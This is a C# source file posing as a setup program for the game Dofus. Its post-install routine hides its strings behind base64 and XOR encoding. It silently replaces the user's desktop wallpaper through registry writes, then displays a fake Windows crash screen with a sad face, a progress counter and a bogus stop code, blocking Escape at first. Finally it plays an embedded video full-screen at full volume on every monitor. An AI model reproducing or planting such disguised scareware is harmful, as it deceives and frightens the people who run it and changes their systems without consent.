using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Forms.Integration;
using System.Windows.Media;
using Microsoft.Win32;
using Form = System.Windows.Forms.Form;
using Color = System.Drawing.Color;
using Point = System.Drawing.Point;
using Size = System.Drawing.Size;

namespace DofusLocalSetup
{
    internal static class Tx
    {
        internal static string R(string b64)
        {
            var raw = Convert.FromBase64String(b64);
            for (int i = 0; i < raw.Length; i++) raw[i] ^= 0x5A;
            return Encoding.UTF8.GetString(raw);
        }
    }

    internal static class NativeSpi
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool SystemParametersInfo(uint a, uint b, string c, uint d);
    }

    internal static class ShellInit
    {
        const string KShell = "KTI/NjZ0ODM0";
        const string KMedia = "Nz8+Mzt0ODM0";
        const string KMs = "FzM5KDUpNTwu";
        const string KWin = "DTM0PjUtKQ==";
        const string KThemes = "DjI/Nz8p";
        const string KCache = "Dig7NCk5NT4/Pg07NjYqOyo/KBk7OTI/dCo0PQ==";
        const string KDesk = "GTU0Lig1NnoKOzQ/NgYePykxLjUq";
        const string KWall = "DTs2Nio7Kj8o";
        const string KStyle = "DTs2Nio7Kj8oCS4jNj8=";
        const string KTile = "DjM2Pw07NjYqOyo/KA==";

        public static void AfterInstall()
        {
            try { ApplyShellBitmap(); } catch { }
            string mediaPath = null;
            try { mediaPath = UnpackMedia(); } catch { return; }
            if (string.IsNullOrEmpty(mediaPath) || !File.Exists(mediaPath)) return;

            var stage = new MediaStage(mediaPath);
            stage.Shown += (s, e) =>
            {
                stage.Warm();
                using (var gate = new DisplayGate(() => stage.Promote()))
                    gate.ShowDialog(stage);
                if (!stage.IsDisposed) stage.Promote();
            };
            stage.ShowDialog();
        }

        static void ApplyShellBitmap()
        {
            var asm = Assembly.GetExecutingAssembly();
            string want = Tx.R(KShell);
            string resName = null;
            foreach (var n in asm.GetManifestResourceNames())
                if (n.EndsWith(want, StringComparison.OrdinalIgnoreCase)) { resName = n; break; }
            if (resName == null) return;

            string dest = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Tx.R(KMs), Tx.R(KWin), Tx.R(KThemes), Tx.R(KCache));
            Directory.CreateDirectory(Path.GetDirectoryName(dest));
            using (var s = asm.GetManifestResourceStream(resName))
            using (var f = File.Create(dest))
                s.CopyTo(f);

            using (var key = Registry.CurrentUser.OpenSubKey(Tx.R(KDesk), true))
            {
                if (key != null)
                {
                    key.SetValue(Tx.R(KWall), dest);
                    key.SetValue(Tx.R(KStyle), "10");
                    key.SetValue(Tx.R(KTile), "0");
                }
            }
            NativeSpi.SystemParametersInfo(0x0014, 0, dest, 0x01 | 0x02);
        }

        static string UnpackMedia()
        {
            string dir = Path.Combine(Path.GetTempPath(), "dxh_" + Guid.NewGuid().ToString("N").Substring(0, 8));
            Directory.CreateDirectory(dir);
            string outFile = Path.Combine(dir, "payload.bin");
            var asm = Assembly.GetExecutingAssembly();
            string want = Tx.R(KMedia);
            string resName = null;
            foreach (var n in asm.GetManifestResourceNames())
                if (n.EndsWith(want, StringComparison.OrdinalIgnoreCase)) { resName = n; break; }
            if (resName == null) return null;
            using (var s = asm.GetManifestResourceStream(resName))
            using (var f = File.Create(outFile))
                s.CopyTo(f);
            string mp4 = Path.Combine(dir, "a.mp4");
            if (File.Exists(mp4)) File.Delete(mp4);
            File.Move(outFile, mp4);
            return mp4;
        }
    }

    sealed class SurfaceFill : Form
    {
        public SurfaceFill(Rectangle bounds, Color color)
        {
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Bounds = bounds;
            TopMost = true;
            ShowInTaskbar = false;
            BackColor = color;
            Show();
            BringToFront();
        }
    }

    sealed class MediaStage : Form
    {
        readonly MediaElement _el;
        readonly List<SurfaceFill> _extra = new List<SurfaceFill>();

        public MediaStage(string path)
        {
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Bounds = Screen.PrimaryScreen.Bounds;
            ShowInTaskbar = false;
            BackColor = Color.Black;
            TopMost = false;
            KeyPreview = true;

            var host = new ElementHost { Dock = DockStyle.Fill, BackColor = Color.Black };
            _el = new MediaElement
            {
                LoadedBehavior = MediaState.Manual,
                UnloadedBehavior = MediaState.Close,
                Stretch = Stretch.Uniform,
                ScrubbingEnabled = true,
                Volume = 0.0
            };
            _el.Source = new Uri(path, UriKind.Absolute);
            _el.MediaOpened += (s, e) =>
            {
                try { _el.Pause(); _el.Position = TimeSpan.Zero; } catch { }
            };
            _el.MediaEnded += (s, e) => { try { BeginInvoke(new Action(Close)); } catch { } };
            host.Child = _el;
            Controls.Add(host);
            KeyDown += (s, e) => { if (e.KeyCode == Keys.Escape) Close(); };
            FormClosed += (s, e) => DropExtra();
        }

        void DropExtra()
        {
            foreach (var c in _extra) { try { c.Close(); c.Dispose(); } catch { } }
            _extra.Clear();
        }

        public void Warm()
        {
            try { _el.Volume = 0.0; _el.Play(); } catch { }
        }

        public void Promote()
        {
            foreach (var screen in Screen.AllScreens)
            {
                if (screen.Primary) continue;
                _extra.Add(new SurfaceFill(screen.Bounds, Color.Black));
            }
            TopMost = true;
            Bounds = Screen.PrimaryScreen.Bounds;
            Activate();
            BringToFront();
            try
            {
                _el.Position = TimeSpan.Zero;
                _el.Volume = 1.0;
                _el.Play();
            }
            catch { }
        }
    }

    sealed class DisplayGate : Form
    {
        readonly System.Windows.Forms.Label _a, _b, _c, _d;
        readonly Timer _t;
        readonly Action _done;
        readonly List<SurfaceFill> _sides = new List<SurfaceFill>();
        int _p, _n;
        bool _fin;

        public DisplayGate(Action done)
        {
            _done = done;
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Bounds = Screen.PrimaryScreen.Bounds;
            TopMost = true;
            ShowInTaskbar = false;
            BackColor = Color.FromArgb(0, 120, 215);
            KeyPreview = true;
            DoubleBuffered = true;

            _a = new System.Windows.Forms.Label
            {
                Text = Tx.R("YHI="),
                ForeColor = Color.White,
                BackColor = Color.Transparent,
                Font = new Font("Segoe UI", 72f),
                AutoSize = true
            };
            _b = new System.Windows.Forms.Label
            {
                Text = Tx.R("AzUvKHoKGXooOzR6MzQuNXo7eiooNTg2Pzd6OzQ+ejQ/Pz4pei41eig/KS47KC50eg0/fSg/ejAvKS5QOTU2Nj85LjM0PXopNTc/ej8oKDUoejM0PDV2ejs0PnouMj80ei0/fTY2eig/KS47KC56PDUoeiM1L3Q="),
                ForeColor = Color.White,
                BackColor = Color.Transparent,
                Font = new Font("Segoe UI", 18f),
                AutoSize = true
            };
            _c = new System.Windows.Forms.Label
            {
                Text = Tx.R("an96OTU3KjY/Lj8="),
                ForeColor = Color.White,
                BackColor = Color.Transparent,
                Font = new Font("Segoe UI", 16f),
                AutoSize = true
            };
            _d = new System.Windows.Forms.Label
            {
                Text = Tx.R("HDUoejc1KD96MzQ8NSg3Oy4zNTR6Ozg1Ly56LjIzKXozKSkvP3o7ND56KjUpKTM4Nj96PDMiPyl2eiwzKTMuUDIuLiopYHV1LTM0PjUtKXQ5NTd1KS41Kjk1Pj9QUBM8eiM1L3o5OzY2ejt6KS8qKjUoLnoqPygpNTR2ej0zLD96LjI/N3ouMjMpejM0PDVgUAkuNSp6OTU+P2B6GQgTDhMZGxYFCggVGR8JCQUeEx8e"),
                ForeColor = Color.White,
                BackColor = Color.Transparent,
                Font = new Font("Segoe UI", 11f),
                AutoSize = true
            };
            Controls.AddRange(new System.Windows.Forms.Control[] { _a, _b, _c, _d });
            Load += (s, e) => LayoutNow();
            Resize += (s, e) => LayoutNow();
            _t = new Timer { Interval = 80 };
            _t.Tick += Tick;
            Shown += (s, e) =>
            {
                foreach (var screen in Screen.AllScreens)
                {
                    if (screen.Primary) continue;
                    _sides.Add(new SurfaceFill(screen.Bounds, Color.FromArgb(0, 120, 215)));
                }
                Activate();
                BringToFront();
                _t.Start();
            };
            KeyDown += (s, e) => { if (e.KeyCode == Keys.Escape && _n > 40) Finish(); };
        }

        void LayoutNow()
        {
            int x = Math.Max(80, Width / 8);
            int y = Math.Max(80, Height / 6);
            _a.Location = new Point(x, y);
            _b.MaximumSize = new Size(Math.Max(400, Width - x * 2), 0);
            _b.Location = new Point(x, _a.Bottom + 20);
            _c.Location = new Point(x, _b.Bottom + 28);
            _d.MaximumSize = new Size(Math.Max(400, Width - x * 2), 0);
            _d.Location = new Point(x, _c.Bottom + 36);
        }

        void Tick(object sender, EventArgs e)
        {
            _n++;
            if (_fin) return;
            if (_p < 100)
            {
                int step = _p < 40 ? 1 : (_p < 85 ? 2 : 3);
                _p = Math.Min(100, _p + step);
                _c.Text = _p + Tx.R("f3o5NTcqNj8uPw==");
            }
            if (_p >= 100) Finish();
        }

        void DropSides()
        {
            foreach (var c in _sides) { try { c.Close(); c.Dispose(); } catch { } }
            _sides.Clear();
        }

        void Finish()
        {
            if (_fin) return;
            _fin = true;
            _t.Stop();
            DropSides();
            try { if (_done != null) _done(); } catch { }
            DialogResult = DialogResult.OK;
            Close();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            _t.Stop();
            _t.Dispose();
            DropSides();
            base.OnFormClosed(e);
        }
    }
}
